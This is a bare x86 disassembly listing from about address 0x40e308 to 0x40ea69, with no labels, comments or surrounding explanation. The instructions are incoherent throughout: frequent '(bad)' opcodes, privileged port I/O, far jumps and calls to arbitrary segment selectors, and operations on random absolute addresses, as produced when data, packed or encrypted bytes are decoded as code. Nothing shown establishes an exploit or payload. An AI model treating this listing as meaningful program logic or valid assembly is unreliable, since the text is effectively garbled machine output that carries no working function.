  40e308:	adc    BYTE PTR [eax-0x335a3dd1],al
  40e30e:	cmp    al,0x75
  40e310:	adc    DWORD PTR [edi-0x67c9f1cd],ebx
  40e316:	rcl    DWORD PTR [esi],1
  40e318:	xor    ebx,DWORD PTR [edi+ebx*2]
  40e31b:	xchg   esp,eax
  40e31c:	lods   eax,DWORD PTR ds:[esi]
  40e31d:	lea    ecx,[ebx]
  40e31f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e320:	sub    eax,0x4a6b6aca
  40e325:	ja     0x40e2ad
  40e327:	sbb    eax,0x20886bc4
  40e32c:	pusha  
  40e32d:	cld    
  40e32e:	imul   ebx,DWORD PTR [ebp+ecx*8+0x1f06a3ba],0x8be39c19
  40e339:	ja     0x40e2c2
  40e33b:	ror    DWORD PTR [eax+0x47],cl
  40e33e:	dec    edi
  40e33f:	mov    ah,0x8f
  40e341:	aas    
  40e342:	mov    edi,0x95199fe8
  40e347:	dec    eax
  40e348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e349:	push   es
  40e34a:	loopne 0x40e2f3
  40e34c:	inc    ebp
  40e34d:	cmovae edi,DWORD PTR [eax]
  40e350:	jnp    0x40e307
  40e352:	mov    ebx,esp
  40e354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e355:	xor    eax,DWORD PTR [ebp+0x6fa005e7]
  40e35b:	stos   BYTE PTR es:[edi],al
  40e35c:	popa   
  40e35d:	out    dx,al
  40e35e:	push   ebx
  40e35f:	js     0x40e2f5
  40e361:	movsx  ecx,BYTE PTR cs:[edi-0x31]
  40e366:	mov    al,0xc8
  40e368:	popf   
  40e369:	mov    al,fs:0xc372af11
  40e36f:	lods   al,BYTE PTR ds:[esi]
  40e370:	out    0xc9,eax
  40e372:	cmp    edx,DWORD PTR [ecx-0x11384b27]
  40e378:	stc    
  40e379:	sub    ebx,eax
  40e37b:	js     0x40e3cc
  40e37d:	je     0x40e3dd
  40e37f:	jb     0x40e308
  40e381:	enter  0x2987,0xcb
  40e385:	push   esp
  40e386:	push   edi
  40e387:	and    BYTE PTR [edi-0x79],bh
  40e38a:	cmp    ebp,DWORD PTR [esi]
  40e38c:	pop    ebx
  40e38d:	mov    ecx,0x6bdd88a2
  40e392:	inc    esp
  40e393:	inc    ecx
  40e394:	fstp   QWORD PTR [edi+0x17]
  40e397:	pop    edx
  40e398:	repz xor ch,BYTE PTR [eax+ebx*8-0x5c20cb7a]
  40e3a0:	int    0x54
  40e3a2:	(bad)  
  40e3a3:	es ds std 
  40e3a6:	lods   eax,DWORD PTR ds:[esi]
  40e3a7:	(bad)  
  40e3a8:	or     esi,DWORD PTR [edx-0x43]
  40e3ab:	push   ds
  40e3ac:	fwait
  40e3ad:	add    BYTE PTR [ebx-0x543976b3],dh
  40e3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b4:	stos   BYTE PTR es:[edi],al
  40e3b5:	ss xchg ebx,eax
  40e3b7:	inc    esp
  40e3b8:	inc    eax
  40e3b9:	icebp  
  40e3ba:	pop    ebx
  40e3bb:	add    ecx,ebp
  40e3bd:	or     ch,bl
  40e3bf:	jg     0x40e38f
  40e3c1:	stos   BYTE PTR es:[edi],al
  40e3c2:	sbb    BYTE PTR [eax-0x58115d95],ch
  40e3c8:	dec    esi
  40e3c9:	jg     0x40e414
  40e3cb:	ins    DWORD PTR es:[edi],dx
  40e3cc:	jmp    0x9e6c:0x19bb954d
  40e3d3:	xchg   esp,eax
  40e3d4:	jge    0x40e3ad
  40e3d6:	aas    
  40e3d7:	sti    
  40e3d8:	pop    ebp
  40e3d9:	inc    ebx
  40e3da:	push   0x9b4a0994
  40e3df:	sar    edi,cl
  40e3e1:	xchg   DWORD PTR [ebp+0x61e6b74f],edi
  40e3e7:	dec    ebx
  40e3e8:	xchg   edi,eax
  40e3e9:	sub    al,0x15
  40e3eb:	sbb    eax,0xdb93bf7b
  40e3f0:	jp     0x40e3e0
  40e3f2:	add    BYTE PTR [eax],0x52
  40e3f5:	pop    es
  40e3f6:	scas   eax,DWORD PTR es:[edi]
  40e3f7:	or     BYTE PTR [eax+0x2],dl
  40e3fa:	inc    ebx
  40e3fb:	mov    al,ds:0x3eb5f0b0
  40e400:	pusha  
  40e401:	sbb    BYTE PTR ds:0x6e461a3e,bl
  40e407:	call   0x953fb765
  40e40c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e40d:	sbb    al,0xf8
  40e40f:	cs mov eax,0x52459a63
  40e415:	repz mov WORD PTR [edx],gs
  40e418:	cmp    al,0xb2
  40e41a:	mov    ecx,0xfc8a2b94
  40e41f:	call   0x9409:0xd055f2b1
  40e426:	pop    ds
  40e427:	in     eax,dx
  40e428:	fs repnz and al,0x11
  40e42c:	inc    ebx
  40e42d:	cmc    
  40e42e:	aam    0xdb
  40e430:	pop    esi
  40e431:	mov    esp,0xde95de80
  40e436:	push   0x14
  40e438:	mov    eax,ds:0xcab7a9ce
  40e43d:	or     al,0x81
  40e43f:	test   BYTE PTR [edx-0x62b55088],cl
  40e445:	jge    0x40e475
  40e447:	push   esi
  40e448:	mov    edi,0x8ad6f409
  40e44d:	or     BYTE PTR [ebx+0x29b0ab18],dl
  40e453:	in     eax,dx
  40e454:	gs pop edi
  40e456:	test   DWORD PTR [ebx-0x3ef15661],eax
  40e45c:	scas   eax,DWORD PTR es:[edi]
  40e45d:	fstp   st(4)
  40e45f:	paddw  mm6,mm5
  40e462:	out    0xc0,eax
  40e464:	dec    edx
  40e465:	psubq  mm6,QWORD PTR [edi]
  40e468:	inc    esi
  40e469:	jns    0x40e4af
  40e46b:	repnz sbb eax,0x9ef14c00
  40e471:	ficom  WORD PTR [ecx+0x766816fa]
  40e477:	clc    
  40e478:	inc    esp
  40e479:	lock popa 
  40e47b:	dec    esi
  40e47c:	lods   al,BYTE PTR ds:[esi]
  40e47d:	mov    WORD PTR [ebx+0x73],?
  40e480:	pop    ss
  40e481:	sub    al,0x6b
  40e483:	test   al,0xb4
  40e485:	pop    ebx
  40e486:	and    esi,esi
  40e488:	sub    ebx,DWORD PTR [esi+0x1e65c5af]
  40e48e:	cmp    DWORD PTR [edx+0x3a],ecx
  40e491:	mov    al,0x8a
  40e493:	sbb    bl,BYTE PTR [ecx]
  40e495:	pusha  
  40e496:	dec    esi
  40e497:	pop    edi
  40e498:	mov    cs,WORD PTR [edi]
  40e49a:	pop    esi
  40e49b:	adc    eax,0xcba725b8
  40e4a0:	lods   eax,DWORD PTR ds:[esi]
  40e4a1:	mov    dl,0xe9
  40e4a3:	push   eax
  40e4a4:	add    cl,BYTE PTR [eax+0x5062c304]
  40e4aa:	fdivr  DWORD PTR [esi+0x16]
  40e4ad:	cdq    
  40e4ae:	loopne 0x40e4d5
  40e4b0:	scas   al,BYTE PTR es:[edi]
  40e4b1:	push   0x71
  40e4b3:	push   ss
  40e4b4:	push   0xffffffce
  40e4b6:	mov    eax,ds:0x6b544f56
  40e4bb:	call   0x3f3d:0xba0ea5b9
  40e4c2:	xchg   BYTE PTR [eax+ebx*1-0x31],dl
  40e4c6:	lods   eax,DWORD PTR ds:[esi]
  40e4c7:	add    bh,BYTE PTR [edx-0x6d]
  40e4ca:	push   cs
  40e4cb:	out    dx,al
  40e4cc:	into   
  40e4cd:	xlat   BYTE PTR ds:[ebx]
  40e4ce:	push   ecx
  40e4cf:	adc    al,BYTE PTR [ebp-0x1948a2b1]
  40e4d5:	rcr    DWORD PTR [edi+0x20],0xb1
  40e4d9:	adc    bl,BYTE PTR [ecx-0x68]
  40e4dc:	add    al,0xbd
  40e4de:	jmp    0x40e466
  40e4e0:	or     edx,ecx
  40e4e2:	iret   
  40e4e3:	int    0x4a
  40e4e5:	xchg   ecx,eax
  40e4e6:	inc    esi
  40e4e7:	fdecstp 
  40e4e9:	jg     0x40e522
  40e4eb:	add    ah,BYTE PTR [eax-0x23]
  40e4ee:	je     0x40e557
  40e4f0:	push   cs
  40e4f1:	adc    al,0x7d
  40e4f3:	clc    
  40e4f4:	dec    edi
  40e4f5:	imul   edx,ecx,0x28
  40e4f8:	lea    ebp,[ecx]
  40e4fa:	fist   DWORD PTR [esp+eax*8-0x34213e25]
  40e501:	fisubr DWORD PTR [esi]
  40e503:	jbe    0x40e4ca
  40e505:	loopne 0x40e4d1
  40e507:	gs xchg esi,eax
  40e509:	inc    esi
  40e50a:	jb     0x40e542
  40e50c:	jge    0x40e529
  40e50e:	call   0xd264d83
  40e513:	repnz pop ss
  40e515:	loopne 0x40e56f
  40e517:	jno    0x40e4e2
  40e519:	ffree  st(6)
  40e51b:	push   es
  40e51c:	retf   0x2b04
  40e51f:	scas   al,BYTE PTR es:[edi]
  40e520:	loope  0x40e56a
  40e522:	ss xchg esi,eax
  40e524:	cli    
  40e525:	and    al,0x7d
  40e527:	xor    eax,edi
  40e529:	cld    
  40e52a:	in     eax,dx
  40e52b:	ds scas al,BYTE PTR es:[edi]
  40e52d:	sbb    eax,0x9560508d
  40e532:	inc    edx
  40e533:	add    ebp,DWORD PTR gs:[eax+0x681fe705]
  40e53a:	pushf  
  40e53b:	sbb    BYTE PTR [ecx+ebp*2+0x2b],ch
  40e53f:	xchg   ah,ch
  40e541:	fcom   st(4)
  40e543:	enter  0x7795,0xf
  40e547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e548:	add    DWORD PTR [ebx+0x757c37c1],edi
  40e54e:	gs ss xor eax,0xf5985b6e
  40e555:	sahf   
  40e556:	ds aam 0xcd
  40e559:	test   eax,0x166894d9
  40e55e:	iret   
  40e55f:	mov    esp,0xc54a71c7
  40e564:	pop    ebx
  40e565:	xchg   ebx,eax
  40e566:	and    dl,cl
  40e568:	dec    ecx
  40e569:	push   esp
  40e56a:	lds    edi,FWORD PTR [esi]
  40e56c:	aam    0x9e
  40e56e:	cmp    BYTE PTR [ebx-0x7a],ah
  40e571:	out    0x5a,eax
  40e573:	(bad)  
  40e574:	out    dx,eax
  40e575:	inc    DWORD PTR ds:0x72f0dd58
  40e57b:	rcl    BYTE PTR [eax+0x534d673f],cl
  40e581:	aad    0xf2
  40e583:	or     al,0x67
  40e585:	ja     0x40e5d2
  40e587:	sub    DWORD PTR [edx-0x6acacfef],esi
  40e58d:	adc    eax,DWORD PTR [ecx+0x3d3a553a]
  40e593:	shl    DWORD PTR [edx-0x11042a73],1
  40e599:	dec    edi
  40e59a:	nop
  40e59b:	lock es adc al,0x9
  40e59f:	enter  0xdc51,0x1
  40e5a3:	lods   al,BYTE PTR ds:[esi]
  40e5a4:	pop    fs
  40e5a6:	dec    edi
  40e5a7:	out    0xd4,ax
  40e5aa:	bound  esi,QWORD PTR [edx+0x7a]
  40e5ad:	adc    esi,esi
  40e5af:	pop    esi
  40e5b0:	loope  0x40e563
  40e5b2:	sub    edi,DWORD PTR ds:0xdf7f3d91
  40e5b8:	loop   0x40e5f2
  40e5ba:	cld    
  40e5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5bc:	mov    ds:0x7682f5ba,eax
  40e5c1:	sub    esp,DWORD PTR [ebp+eax*1+0x1a4c7b0c]
  40e5c8:	mov    ah,0x10
  40e5ca:	fst    DWORD PTR [eax-0x23]
  40e5cd:	cs dec edi
  40e5cf:	push   ebx
  40e5d0:	shl    DWORD PTR [esp+esi*4-0xe],cl
  40e5d4:	and    edi,ecx
  40e5d6:	out    dx,al
  40e5d7:	cmc    
  40e5d8:	je     0x40e589
  40e5da:	dec    ecx
  40e5db:	call   0xb37cc1c3
  40e5e0:	(bad)
  40e5e3:	out    dx,al
  40e5e4:	and    eax,0xdd32b801
  40e5e9:	mov    ch,0x2a
  40e5eb:	mov    fs,ecx
  40e5ed:	xchg   edx,eax
  40e5ee:	ds pop ecx
  40e5f0:	and    dh,BYTE PTR [eax+0x4c8cbec0]
  40e5f6:	fsub   DWORD PTR [eax-0x334808f2]
  40e5fc:	sti    
  40e5fd:	mov    al,ds:0x5a9c06c0
  40e602:	imul   BYTE PTR [ecx-0x3b0eeba4]
  40e608:	test   DWORD PTR ds:0x34218cd4,ebx
  40e60e:	mov    edx,0x94702924
  40e613:	out    0xa6,eax
  40e615:	(bad)  
  40e616:	ins    BYTE PTR es:[edi],dx
  40e617:	xchg   esp,eax
  40e618:	test   BYTE PTR [ecx+0x50],al
  40e61b:	lods   al,BYTE PTR ds:[esi]
  40e61c:	rcr    DWORD PTR [esi+eiz*1+0x67169f6d],0x3
  40e624:	pushf  
  40e625:	and    DWORD PTR ds:0x6b61b69e,eax
  40e62b:	loopne 0x40e60d
  40e62d:	and    ebp,DWORD PTR [ebx]
  40e62f:	sbb    dh,bh
  40e631:	das    
  40e632:	mov    cl,0x71
  40e634:	pop    ebp
  40e635:	int3   
  40e636:	les    edi,FWORD PTR [edi-0x1e]
  40e639:	and    eax,0x59c0d72b
  40e63e:	in     al,dx
  40e63f:	mov    esp,DWORD PTR [eax+ebx*4-0x5fd51133]
  40e646:	rcl    BYTE PTR [edx+esi*4+0x6b],1
  40e64a:	je     0x40e647
  40e64c:	jne    0x40e632
  40e64e:	xchg   DWORD PTR [edx-0x33],ebp
  40e651:	cmp    eax,0xdedfc848
  40e656:	push   0x4e
  40e658:	and    BYTE PTR [ecx+0x61],0x76
  40e65c:	fstp   TBYTE PTR [ebp+0x6c]
  40e65f:	hlt    
  40e660:	push   ss
  40e661:	out    dx,al
  40e662:	mov    ah,0xbf
  40e664:	xor    eax,0xc876670
  40e669:	push   ss
  40e66a:	scas   al,BYTE PTR es:[edi]
  40e66b:	in     eax,0x1d
  40e66d:	mov    edi,0xcbd3e54b
  40e672:	cs push ebp
  40e674:	or     al,0x60
  40e676:	cwde   
  40e677:	dec    ebp
  40e678:	sbb    ecx,DWORD PTR [esi+0x1aabf7ef]
  40e67e:	push   0xa90538bd
  40e683:	aad    0xdd
  40e685:	mov    dh,0x14
  40e687:	lahf   
  40e688:	shl    DWORD PTR [ebx+eax*2],0x21
  40e68c:	xchg   BYTE PTR [eax+0x2f],al
  40e68f:	jg     0x40e70a
  40e691:	popf   
  40e692:	push   ds
  40e693:	es jmp 0x21f14514
  40e699:	pop    ebx
  40e69a:	into   
  40e69b:	pop    ecx
  40e69c:	push   cs
  40e69d:	dec    ebx
  40e69e:	pop    eax
  40e69f:	enter  0x1e75,0xde
  40e6a3:	dec    eax
  40e6a4:	xor    BYTE PTR [edi+0x65f94fca],bl
  40e6aa:	jg     0x40e62c
  40e6ac:	ds retf 
  40e6ae:	mov    esp,0x4477a70b
  40e6b3:	mov    dl,0x68
  40e6b5:	sub    al,0x99
  40e6b7:	adc    bh,bl
  40e6b9:	call   0xe31e:0x1a524e7a
  40e6c0:	js     0x40e6ee
  40e6c2:	pop    ebx
  40e6c3:	mov    eax,ds:0xb7a6e390
  40e6c8:	xlat   BYTE PTR ds:[ebx]
  40e6c9:	dec    eax
  40e6ca:	mov    eax,ds:0xb4fd98ff
  40e6cf:	push   es
  40e6d0:	sti    
  40e6d1:	dec    ecx
  40e6d2:	test   al,0xb
  40e6d4:	repz mov esp,0xc3c28ff5
  40e6da:	mov    edi,0x321fb10e
  40e6df:	mov    cs,WORD PTR [edi+0xca539be]
  40e6e5:	pusha  
  40e6e6:	sbb    ah,0x31
  40e6e9:	pop    eax
  40e6ea:	jle    0x40e75f
  40e6ec:	sub    al,0x9
  40e6ee:	ficomp DWORD PTR [esi-0x5d]
  40e6f1:	scas   al,BYTE PTR es:[edi]
  40e6f2:	xchg   esi,eax
  40e6f3:	cld    
  40e6f4:	loopne 0x40e714
  40e6f6:	sbb    BYTE PTR [edx-0x3],ah
  40e6f9:	push   esp
  40e6fa:	and    esp,esp
  40e6fc:	repnz and al,0x24
  40e6ff:	ret    0xec0e
  40e702:	in     eax,0xb7
  40e704:	loop   0x40e6b5
  40e706:	ficomp WORD PTR ds:0x2149357a
  40e70c:	jp     0x40e777
  40e70e:	pop    ds
  40e70f:	test   BYTE PTR [ecx+0x540b2043],dl
  40e715:	add    BYTE PTR [ecx+esi*2-0x2],bh
  40e719:	scas   eax,DWORD PTR es:[edi]
  40e71a:	daa    
  40e71b:	sahf   
  40e71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e71d:	rol    DWORD PTR [eax],0xc9
  40e720:	xor    al,0x44
  40e722:	adc    al,0xec
  40e724:	mov    bl,ch
  40e726:	(bad)  
  40e727:	mov    dl,0x88
  40e729:	rcl    ch,0x6f
  40e72c:	push   cs
  40e72d:	loope  0x40e6ff
  40e72f:	or     DWORD PTR [ebp-0x19],esi
  40e732:	jp     0x40e79a
  40e734:	dec    edx
  40e735:	cmp    al,0xa2
  40e737:	and    al,0x61
  40e739:	add    dl,BYTE PTR [ecx]
  40e73b:	pop    edx
  40e73c:	cli    
  40e73d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e73e:	aad    0x64
  40e740:	jo     0x40e74a
  40e742:	cmp    dl,bl
  40e744:	cld    
  40e745:	les    edi,FWORD PTR [ecx-0x40]
  40e748:	or     al,0x2
  40e74a:	call   0x652f2ff7
  40e74f:	jb     0x40e7a2
  40e751:	test   DWORD PTR [esi],esi
  40e753:	and    eax,0x54a0817b
  40e759:	xchg   DWORD PTR [ebp+0x64],eax
  40e75c:	mov    bh,0x83
  40e75e:	(bad)  
  40e760:	push   ebp
  40e761:	leave  
  40e762:	push   cs
  40e763:	push   es
  40e764:	or     esi,DWORD PTR [eax+0x6fcf4f2e]
  40e76a:	or     BYTE PTR [ebx-0xa],0xea
  40e76e:	jecxz  0x40e7e0
  40e770:	popa   
  40e771:	mov    al,0xd2
  40e773:	jmp    0xcb1:0x7be78e93
  40e77a:	xchg   ebx,eax
  40e77b:	mov    fs,WORD PTR ds:[edi-0x55]
  40e77f:	rcl    DWORD PTR [edi+ebx*4],1
  40e782:	or     DWORD PTR [edi],edi
  40e784:	push   cs
  40e785:	dec    ebp
  40e786:	mov    ah,0xcf
  40e788:	jo     0x40e781
  40e78a:	push   ds
  40e78b:	outs   dx,DWORD PTR ds:[esi]
  40e78c:	out    dx,al
  40e78d:	sbb    al,0x1f
  40e78f:	push   es
  40e790:	xchg   esp,eax
  40e791:	imul   esp,DWORD PTR [eax+0x6],0xd90762b7
  40e798:	in     eax,0xd8
  40e79a:	fmul   DWORD PTR [eax+0x639f97dd]
  40e7a0:	lods   eax,DWORD PTR ds:[esi]
  40e7a1:	jbe    0x40e7dd
  40e7a3:	xor    edx,DWORD PTR [edi-0x24b5cf17]
  40e7a9:	fdiv   DWORD PTR [ecx+0x5ee2bc6b]
  40e7af:	pushf  
  40e7b0:	inc    eax
  40e7b1:	(bad)  
  40e7b2:	popf   
  40e7b3:	or     BYTE PTR [ebx-0x24f052e9],al
  40e7b9:	jg     0x40e823
  40e7bb:	jl     0x40e827
  40e7bd:	retf   0x2678
  40e7c0:	out    0x3,al
  40e7c2:	xor    DWORD PTR [edi+0x42],edi
  40e7c5:	mov    eax,ds:0xc9adc570
  40e7ca:	test   al,0x79
  40e7cc:	xor    edx,esi
  40e7ce:	pop    edx
  40e7cf:	stos   BYTE PTR es:[edi],al
  40e7d0:	inc    esp
  40e7d1:	mov    esp,0x444762fa
  40e7d6:	dec    ebx
  40e7d7:	push   cs
  40e7d8:	inc    ecx
  40e7d9:	push   0xc
  40e7db:	cmc    
  40e7dc:	jmp    0x2c22:0x8a7b20ec
  40e7e3:	cld    
  40e7e4:	fnsave [edi]
  40e7e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7e7:	xor    ch,ch
  40e7e9:	arpl   WORD PTR [ebp-0x5d18ad3c],bx
  40e7ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7f0:	ins    DWORD PTR es:[edi],dx
  40e7f1:	inc    ecx
  40e7f2:	pop    ds
  40e7f3:	sbb    BYTE PTR [esi+ecx*8],dh
  40e7f6:	pushf  
  40e7f7:	iret   
  40e7f8:	cmp    DWORD PTR [edx],ecx
  40e7fa:	adc    BYTE PTR gs:[edi+0x3087c0d9],dh
  40e801:	adc    eax,0x59c55a4e
  40e806:	or     DWORD PTR [esi+0x2fcb52d],esp
  40e80c:	add    DWORD PTR ds:0x52970d7d,ecx
  40e812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e813:	xchg   esi,eax
  40e814:	adc    DWORD PTR [esi-0x113698b6],eax
  40e81a:	shr    DWORD PTR [edx-0x6badf022],1
  40e820:	jb     0x40e88f
  40e822:	lods   al,BYTE PTR ds:[esi]
  40e823:	loop   0x40e829
  40e825:	stos   DWORD PTR es:[edi],eax
  40e826:	xlat   BYTE PTR ds:[ebx]
  40e827:	ret    
  40e828:	jo     0x40e850
  40e82a:	mov    dl,0x2c
  40e82c:	cli    
  40e82d:	push   ebx
  40e82f:	pop    ecx
  40e830:	aaa    
  40e831:	cmp    dh,BYTE PTR [esi]
  40e833:	sbb    al,0xf3
  40e835:	imul   eax,ebx,0xe217d1dc
  40e83b:	jl     0x40e825
  40e83d:	cmp    bl,dl
  40e83f:	stc    
  40e840:	cmp    edi,DWORD PTR [edx-0x2309a1d]
  40e846:	jl     0x40e851
  40e848:	mov    WORD PTR [ecx-0x5f01f6fd],?
  40e84e:	mov    ch,0x82
  40e850:	jns    0x40e7dd
  40e852:	les    eax,FWORD PTR [edx-0x38e1b6dd]
  40e858:	fdiv   QWORD PTR [ebx-0x55]
  40e85b:	pop    edi
  40e85c:	mov    bl,0x11
  40e85e:	mov    ebx,0x92eda24e
  40e863:	aaa    
  40e864:	(bad)  
  40e865:	outs   dx,BYTE PTR ds:[esi]
  40e867:	daa    
  40e868:	movntq QWORD PTR [ecx+ebp*8-0xc],mm6
  40e86d:	out    0xc5,al
  40e86f:	fnstcw WORD PTR [ebx]
  40e871:	mov    esp,0xcfd8c53e
  40e876:	mov    esi,0xa2db28e8
  40e87b:	jmp    0x40e8c1
  40e87d:	lds    esi,FWORD PTR [ebp+0x13]
  40e880:	mov    ecx,0x8b20dcb7
  40e885:	push   es
  40e886:	cmp    eax,0xafd887ac
  40e88b:	addr16 mov ebx,0xd04173c9
  40e891:	xchg   ecx,eax
  40e892:	call   0xc3fe:0xb3c771c7
  40e899:	mov    ecx,0xc26a9a71
  40e89e:	out    0xb6,al
  40e8a0:	rcl    BYTE PTR [ebp+0x5c],0x92
  40e8a4:	pop    esi
  40e8a5:	repnz adc dl,BYTE PTR [edi]
  40e8a8:	sub    BYTE PTR [esi],al
  40e8aa:	mov    ebp,0xaddf2577
  40e8af:	nop
  40e8b0:	pop    ecx
  40e8b1:	xchg   esi,eax
  40e8b2:	iret   
  40e8b3:	xchg   ecx,eax
  40e8b4:	xor    ecx,DWORD PTR [ebp-0x6964e77e]
  40e8ba:	xor    dh,bh
  40e8bc:	mov    cl,0x2b
  40e8be:	lock popf 
  40e8c0:	fimul  DWORD PTR [ecx-0x35]
  40e8c3:	stos   BYTE PTR es:[edi],al
  40e8c4:	mov    edi,0xad450d91
  40e8c9:	repz mov bh,0x29
  40e8cc:	(bad)  
  40e8cd:	and    BYTE PTR [esi+0x4c],cl
  40e8d0:	jnp    0x40e872
  40e8d2:	dec    eax
  40e8d3:	(bad)  
  40e8d4:	hlt    
  40e8d5:	sub    al,0x3
  40e8d7:	jo     0x40e889
  40e8d9:	ds push ebp
  40e8db:	retf   
  40e8dc:	jecxz  0x40e8a4
  40e8de:	mov    edx,0x5219322c
  40e8e3:	jle    0x40e952
  40e8e5:	push   ebp
  40e8e6:	stc    
  40e8e7:	mov    dl,0x58
  40e8e9:	std    
  40e8ea:	xor    ebx,DWORD PTR [eax-0x30]
  40e8ed:	mov    esi,0x930666ad
  40e8f2:	test   eax,ebx
  40e8f4:	call   FWORD PTR [ebx-0x4d]
  40e8f7:	xor    DWORD PTR [eax-0x22],ecx
  40e8fa:	lock leave 
  40e8fc:	xchg   BYTE PTR [esi],al
  40e8fe:	push   ds
  40e8ff:	mov    eax,ds:0xd48bcafa
  40e904:	push   esi
  40e905:	in     eax,dx
  40e906:	mov    ds:0x64c29ece,eax
  40e90b:	dec    ebp
  40e90c:	sub    ch,BYTE PTR [esi+eax*4-0xd79f9b1]
  40e913:	nop
  40e914:	inc    edi
  40e915:	mov    cl,BYTE PTR [eax]
  40e917:	sub    eax,0x20a858b
  40e91c:	cmp    esi,esp
  40e91e:	imul   ebp,DWORD PTR [edi-0x32c92cdf],0x4b9f09ca
  40e928:	push   edx
  40e929:	js     0x40e8d7
  40e92b:	lock sub DWORD PTR [eax-0x5c6cf405],edi
  40e932:	jae    0x40e9a6
  40e934:	fisubr WORD PTR [ebx]
  40e936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e937:	enter  0xe256,0x6e
  40e93b:	mov    bh,0xcd
  40e93d:	test   BYTE PTR [ecx-0x50],bl
  40e940:	pop    eax
  40e941:	shl    BYTE PTR [eax-0x2d],1
  40e944:	xchg   ebx,eax
  40e945:	xchg   DWORD PTR [edx+edx*8+0x3],esp
  40e949:	or     al,0x35
  40e94b:	fcom   QWORD PTR [ecx]
  40e94d:	and    al,0xaf
  40e94f:	or     eax,0xbaaee177
  40e954:	out    dx,al
  40e955:	and    ebp,esp
  40e957:	pop    edi
  40e958:	loopne 0x40e9d0
  40e95a:	faddp  st(4),st
  40e95c:	xchg   edx,eax
  40e95d:	adc    esp,DWORD PTR [eax-0x3f557bd]
  40e963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e964:	(bad)  
  40e965:	sbb    BYTE PTR [edx+0x784b89da],bl
  40e96b:	sti    
  40e96c:	dec    DWORD PTR [ecx+0x6584f6c4]
  40e972:	pushf  
  40e973:	sbb    al,0xd4
  40e975:	push   ss
  40e976:	push   ebx
  40e977:	or     ah,BYTE PTR [ecx-0x43950af9]
  40e97d:	hlt    
  40e97e:	cmp    ch,BYTE PTR [eax]
  40e980:	fbstp  TBYTE PTR ds:[edi-0x26]
  40e984:	scas   al,BYTE PTR es:[edi]
  40e985:	sti    
  40e986:	pop    ebp
  40e987:	jle    0x40e919
  40e989:	push   eax
  40e98a:	pop    ds
  40e98b:	lds    ecx,FWORD PTR [ebp-0x72f3d7d9]
  40e991:	add    cl,ah
  40e993:	cmp    ecx,esi
  40e995:	outs   dx,DWORD PTR ds:[esi]
  40e996:	fdivr  QWORD PTR ds:0xa6fe36ea
  40e99c:	in     al,0xd8
  40e99e:	sbb    edi,DWORD PTR [eax-0x5e]
  40e9a1:	(bad)  
  40e9a2:	fcom   DWORD PTR [esi+0x4a32d650]
  40e9a8:	cmp    al,BYTE PTR [edx-0x377f2c]
  40e9ae:	arpl   WORD PTR [edx+0x57],sp
  40e9b1:	fistp  WORD PTR [eax]
  40e9b3:	mov    bh,0x5
  40e9b5:	adc    bl,al
  40e9b7:	push   edi
  40e9b8:	jmp    0x7397:0xe8b42929
  40e9bf:	push   ebp
  40e9c0:	sbb    al,0x74
  40e9c2:	stos   DWORD PTR es:[edi],eax
  40e9c3:	dec    esp
  40e9c4:	sti    
  40e9c5:	pop    esp
  40e9c6:	cld    
  40e9c7:	push   edi
  40e9c8:	test   DWORD PTR [ecx+ebp*4],eax
  40e9cb:	or     eax,0x4dff8042
  40e9d0:	pop    ecx
  40e9d1:	or     al,0xf1
  40e9d3:	out    dx,eax
  40e9d4:	adc    DWORD PTR [ebp+0x535288f4],edx
  40e9da:	xor    ebx,edx
  40e9dc:	inc    esp
  40e9dd:	and    esi,DWORD PTR [esp+ecx*8]
  40e9e0:	pop    edx
  40e9e1:	arpl   WORD PTR [edx-0xb],bp
  40e9e4:	inc    edi
  40e9e6:	xchg   edx,eax
  40e9e7:	pop    esi
  40e9e8:	xchg   ecx,eax
  40e9e9:	mov    ebx,0x72a190e3
  40e9ee:	in     eax,0x67
  40e9f0:	repnz mov cl,0xd3
  40e9f3:	mov    al,0x92
  40e9f5:	or     al,0x12
  40e9f7:	sbb    BYTE PTR [ebx],cl
  40e9f9:	out    dx,al
  40e9fa:	mov    esp,0xbda81d7
  40e9ff:	cmp    bh,BYTE PTR [ecx-0x683a6f56]
  40ea05:	xchg   edi,eax
  40ea06:	imul   esp,DWORD PTR [edx-0x501626f3],0xffffffa6
  40ea0d:	into   
  40ea0e:	add    ah,0xb6
  40ea11:	and    edi,DWORD PTR [esi]
  40ea13:	add    ch,bl
  40ea15:	mov    BYTE PTR [ebp-0x5c94930c],al
  40ea1b:	adc    BYTE PTR [edi-0x7d],ah
  40ea1e:	test   al,0x46
  40ea20:	(bad)  
  40ea22:	adc    DWORD PTR [edi-0x7a],ecx
  40ea25:	inc    eax
  40ea26:	(bad)  
  40ea28:	jg     0x40ea2d
  40ea2a:	xor    BYTE PTR [edi+ebp*8-0x5a17e435],al
  40ea31:	xchg   BYTE PTR [edx-0x1b],bh
  40ea34:	data16 and bl,BYTE PTR [edi-0x7a6d64ec]
  40ea3b:	sub    al,ch
  40ea3d:	xchg   ch,cl
  40ea3f:	cs jp  0x40eab6
  40ea42:	push   0xd4aa7c2c
  40ea47:	pushf  
  40ea48:	loop   0x40e9e3
  40ea4a:	pop    esp
  40ea4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea4c:	push   esp
  40ea4d:	cmp    eax,0xedde3cb3
  40ea52:	or     al,0x69
  40ea54:	add    edx,DWORD PTR ds:0x956452bc
  40ea5a:	or     dl,BYTE PTR [edx+0x62]
  40ea5d:	and    al,0xe
  40ea5f:	aas    
  40ea60:	push   esi
  40ea61:	test   BYTE PTR [esi+0x16],0x68
  40ea65:	daa    
  40ea66:	cmp    al,0xf2
  40ea68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea69:	stc    
